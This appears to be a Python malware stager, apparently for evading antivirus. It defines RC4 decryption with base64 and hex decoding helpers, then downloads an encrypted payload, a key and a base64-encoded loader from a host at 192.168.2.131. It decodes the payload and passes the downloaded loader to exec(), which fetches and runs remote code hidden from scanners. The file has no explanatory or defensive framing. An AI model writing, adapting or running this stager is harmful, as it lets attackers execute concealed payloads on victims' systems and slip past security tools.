# -*- coding: UTF-8 -*-
import ctypes
import base64
from sys import version_info
if version_info >= (3,0):
    from urllib.request import urlopen
else:
    from urllib2 import urlopen


class Rc4:
    def __init__(self):
        pass
    
    def init_box(self, key):
        s_box = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s_box[i] + ord(key[i % len(key)])) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
        return s_box

    def encrypt(self, message, key):
        ciphertext = self.run(message, key)
        if version_info >= (3,0):
            base64_cipher = str(base64.b64encode(ciphertext.encode('utf-8')), 'utf-8')  # python3
        else:
            base64_cipher = base64.b64encode(ciphertext)
        return base64_cipher

    def decrypt(self, message, key):
        if version_info >= (3,0):
            ciphertext = str(base64.b64decode(message.encode('utf-8')), 'utf-8') # python3
        else:
            ciphertext = base64.b64decode(message)
        plaintext = self.run(ciphertext, key)
        return plaintext

    def run(self, message, key):
        box = self.init_box(key)
        res = []
        i = j = 0
        for s in message:
            i = (i + 1) % 256
            j = (j + box[i]) % 256
            box[i], box[j] = box[j], box[i]
            t = (box[i] + box[j]) % 256
            k = box[t]
            res.append(chr(ord(s) ^ k))
        cipher = "".join(res)
        return cipher


class Encoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64encode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return message.hex()
        else:
            return message.encode('hex')


class Encrypt:
    def __init__(self):
        pass

    def rc4_encrypt(self, message, rc4_key):
        return Rc4().encrypt(message, rc4_key)


class Decoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64decode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return bytes.fromhex(message)
        else:
            return message.decode('hex')


class Decrypt:
    def __init__(self):
        pass

    def rc4_decrypt(self, message, rc4_key):
        return Rc4().decrypt(message, rc4_key)    


if __name__ == "__main__":
    url_code = "http://192.168.2.131/code.txt"
    url_key = "http://192.168.2.131/key.txt"
    url_loader = "http://192.168.2.131/loader.txt"
    key = urlopen(url_key).read().decode()
    code = urlopen(url_code).read().decode()
    base64_loader = urlopen(url_loader).read().decode()
    buf = Decrypt().rc4_decrypt(code, key)
    buf = Decoder()._hex(buf)
    buf = Decoder()._base64(buf)
    if version_info >= (3,0):
        loader = Decoder()._base64(base64_loader.encode('utf-8')).decode("utf-8")
        exec(loader)
    else:
        loader = Decoder()._base64(base64_loader)
        exec(loader)